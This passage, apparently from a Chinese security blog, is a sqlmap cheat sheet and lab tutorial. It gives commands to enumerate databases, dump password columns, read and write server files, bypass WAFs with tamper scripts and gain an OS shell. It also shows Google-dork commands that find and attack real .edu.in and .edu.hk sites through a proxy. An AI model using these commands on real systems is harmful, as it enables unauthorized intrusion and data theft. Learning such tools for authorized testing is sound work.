枚举DBMS数据库中所有的表&#x3D;&#x3D; &#x3D;&#x3D;–columns 枚举DBMS数据库表中所有的列&#x3D;&#x3D; –count 检索表的条目的数量 &#x3D;&#x3D;–dump 存储DBMS数据库的表中的条目&#x3D;&#x3D; –dump-all 存储DBMS所有数据库表中的条目 &#x3D;&#x3D;-D db 指定进行枚举的数据库名称&#x3D;&#x3D; &#x3D;&#x3D;-T table 指定进行枚举的数据库表名称&#x3D;&#x3D; &#x3D;&#x3D;-C column 指定进行枚举的数据库列名称&#x3D;&#x3D; –exclude-sysdbs 枚举表时排除系统数据库 –sql-query 指定查询的sql语句 –sql-shell 提示输入一个交互式sql shell Brute force&#x3D;&#x3D;–common-tables 暴力破解表&#x3D;&#x3D; &#x3D;&#x3D;–common-colomns 暴力破解列&#x3D;&#x3D; File system access–file-read 从目标数据库管理文件系统读取文件 –file-write 上传文件到目标数据库管理文件系统 –file-dest 指定写入文件的绝对路径 –os-cmd&#x3D; 执行操作系统命令 &#x3D;&#x3D;–os-shell 交互式的系统shell&#x3D;&#x3D; –os-pwn 获取一个OOB shell，Meterpreter或者VNC –os-smbrelay 一键 获取一个OOB shell，Meterpreter或者VNC –os-bof 储存过程缓冲区溢出利用 –os-esc 数据库进程用户权限提升 –msf-path&#x3D; Metasploit Framework本地安装路径 General-s sqlite会话文件保存位置 -t 记录所有HTTP流量到指定文件中 &#x3D;&#x3D;–batch 测试过程中， 执行所有默认配置&#x3D;&#x3D; –charset&#x3D;v 强制用于数据检索的字符编码 –crawl&#x3D; 从目标URL开始爬取网站 –crawl-exclude&#x3D; 禁止爬取某个页面（eg：logout） –csv-del&#x3D; 指定CSV输出中使用的的字符 –dump-format&#x3D; 储存数据的方式（CSV(default)，HTML，SQLITE） –flush-session 刷新当前目标的会话文件 –fresh-queries 忽略会话文件中储存的查询结果，重新查询 –hex 使用DBMS hex函数进行数据检索 –outpout-dir&#x3D; 自定义输出目录 –save&#x3D; 保存选项到INI配置文件中 –scope&#x3D; 使用正则表达式从提供的日志中过滤 –alert 再找到SQL注入时运行主机操作系统命令 –purge-output 安全的从输出目录中删除所有内容 –sqlmap-shell 提示输入交互式sqlmap shell –update 更新sqlmap sqlmap注入技术简介–technique&#x3D; （默认全部使用） B 基于布尔的盲注 T 基于时间的盲注 E 基于报错的注入 U 基于UNION查询注入 S 基于多语句查询注入 sqlmap获取目标方式&#x3D;&#x3D;1.指定目标url&#x3D;&#x3D;（常用）sqlmap -u “http://192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1“ 2.从文件中获取多个urlsqlmap -m 1.txt 3.从文件中加载HTTP请求sqlmap -r url.txt 4.利用google获取目标sqlmap -g “site:”edu.in” inurl:&quot;.php?id&#x3D;1&quot;“ –proxy http://192.168.255.1:7890 sqlmap -g “site:”edu.hk” inurl:”.php?id&#x3D;1”” –hex –tamper&#x3D;”space2randomblank.py” –batch –current-db –proxy http://192.168.255.1:7890 5.从burp日志中获取目标sqlmap -l burp.txt 实例演示-sqlmap注入检测1.GET参数注入sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” 2.POST参数注入sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1” –data&#x3D;”id&#x3D;1” 3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）sqlmap -u “http:&#x2F;192.168.3.2&#x2F;sqli-labs-master&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1” –level 2 用*指定cookie sqlmap -r “load” 实战演练普通破解1.查看数据库sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ –dbs –batch -u: Target –dbs: Emuneration –batch: General 2.查看数据库里面的表sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security –tables –batch -u: Target -D、–tables: Emuneration –batch: General 3.查看数据库表里面的列sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security -T users –columns –batch -u: Target -D、-T 、–columns: Emuneration –batch: General 4.查看数据库列里面的具体的值sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security -T users -C password –dump –batch -u: Target -D、-T 、-C、–dump: Emuneration –batch: General 5、直接查看表里的所有数据sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security -T users –dump sqlmap -u “http://192.168.10.1/sqli/Less-1/?id=1“ -D security –dump-all 爆出数据库security中的所有数据 暴力破解使用条件： 1.MySQL数据库版本小于5.0，没有information_schema表。 2.Microssoft Access数据库 3.当前用户没有权限读取系统中保存的数据。 &#x3D;&#x3D;注意&#x3D;&#x3D;：暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中 1、暴力破解表名sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security –common-tables –batch 2、暴力破解列名sqlmap -u “http://192.168.241.1/sqli/Less-1/?id=1“ -D security -T users –common-columns –batch 读取文件&#x2F;上传文件读文件：–file-read “要读取的文件所在绝对路径” python sqlmap.py -u “http://192.168.67.140/sqli/Less-7/?id=1“ –file-read “E:&#x2F;&#x2F;flag1.txt”写文件(将本地文件上载到数据库服务器的文件系统)：–file-write&#x3D;”要保存到服务器的本地文件（必须是在本地也就是攻击机中已经存在的文件）” –file-dest “本地也就是攻击机中已经存在的文件要在目标网站中保存的地址” python sqlmap.py -u “http://192.168.67.140/sqli/Less-7/?id=1“ –file-write&#x3D;”E:&#x2F;&#x2F;flag.txt” –file-dest “E:&#x2F;&#x2F;“ sqlmap高级使用这里要借用一个工具Atlas 工具地址：https://github.com/m4ll0k/Atlas 123456789Usage先使用sqlmap检测是否有wafpython sqlmap.py -u &#x27;http://site.com/index.php?id=Price_ASC&#x27; --dbs --random-agent -v 3寻找tamper$ python atlas.py --url &#x27;http://site.com/index.php?id=Price_ASC&#x27; --payload=&quot;&#x27;) AND 8716=4837 AND (&#x27;yajr&#x27;=&#x27;yajr&quot; --random-agent -v使用找到的tamper$ python sqlmap.py -u &#x27;http://site.com/index.php?id=Price_ASC&#x27; --dbs --random-agent -v 3 --tamper=versionedkeywords,... 获取shell的步骤：1、查看当前数据库的名字和用户-u xxxx –current-db -u xxxx –current-user 2、查看数据库的版本信息 sqlmap -u “url” -b 3、查看是否有dba权限 sqlmap -u “url” –is-dba 若是有&#x3D;&#x3D;dba&#x3D;&#x3D;权限，&#x3D;&#x3D;xp_cmdshell&#x3D;&#x3D;也开启了，那么 可以用 &#x3D;&#x3D;sqlmap -u xxxx –os-cmd&#x3D;whoami&#x3D;&#x3D;得到shell 参考学习： https://www.cnblogs.com/xinxin999/p/12411990.html https://github.com/xinxin999/My-Summarizing http://www.safe6.cn/article/211 kali更新sqlmap1234567cd usr/sharerm -rf usr/share/sqlmapgit clone https://github.com/sqlmapproject/sqlmapsqlmap -h","categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"工具使用/数据库","slug":"工具使用-数据库","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}],"categories":[{"name":"工具","slug":"工具","permalink":"http://dale.us.kg/categories/%E5%B7%A5%E5%85%B7/"},{"name":"内网渗透","slug":"内网渗透","permalink":"http://dale.us.kg/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"应急响应","slug":"应急响应","permalink":"http://dale.us.kg/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"网站建设","slug":"网站建设","permalink":"http://dale.us.kg/categories/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"},{"name":"java安全","slug":"java安全","permalink":"http://dale.us.kg/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"c2隐藏","slug":"c2隐藏","permalink":"http://dale.us.kg/tags/c2%E9%9A%90%E8%97%8F/"},{"name":"cobaltstrike","slug":"cobaltstrike","permalink":"http://dale.us.kg/tags/cobaltstrike/"},{"name":"应急响应/windows/实战","slug":"应急响应-windows-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-windows-%E5%AE%9E%E6%88%98/"},{"name":"应急响应/Linux/实战","slug":"应急响应-Linux-实战","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E5%AE%9E%E6%88%98/"},{"name":"网站建设","slug":"网站建设","permalink":"http://dale.us.kg/tags/%E7%BD%91%E7%AB%99%E5%BB%BA%E8%AE%BE/"},{"name":"代码审计/java/实战","slug":"代码审计-java-实战","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E5%AE%9E%E6%88%98/"},{"name":"应急响应/Linux/笔记","slug":"应急响应-Linux-笔记","permalink":"http://dale.us.kg/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux-%E7%AC%94%E8%AE%B0/"},{"name":"工具使用/fuzz","slug":"工具使用-fuzz","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-fuzz/"},{"name":"工具使用/403绕过","slug":"工具使用-403绕过","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-403%E7%BB%95%E8%BF%87/"},{"name":"工具使用/代理池","slug":"工具使用-代理池","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E4%BB%A3%E7%90%86%E6%B1%A0/"},{"name":"工具使用/owasp","slug":"工具使用-owasp","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-owasp/"},{"name":"工具使用/projectdiscovery","slug":"工具使用-projectdiscovery","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-projectdiscovery/"},{"name":"代码审计/java/笔记/反序列化","slug":"代码审计-java-笔记-反序列化","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"代码审计/java/笔记","slug":"代码审计-java-笔记","permalink":"http://dale.us.kg/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-java-%E7%AC%94%E8%AE%B0/"},{"name":"工具使用/数据库","slug":"工具使用-数据库","permalink":"http://dale.us.kg/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}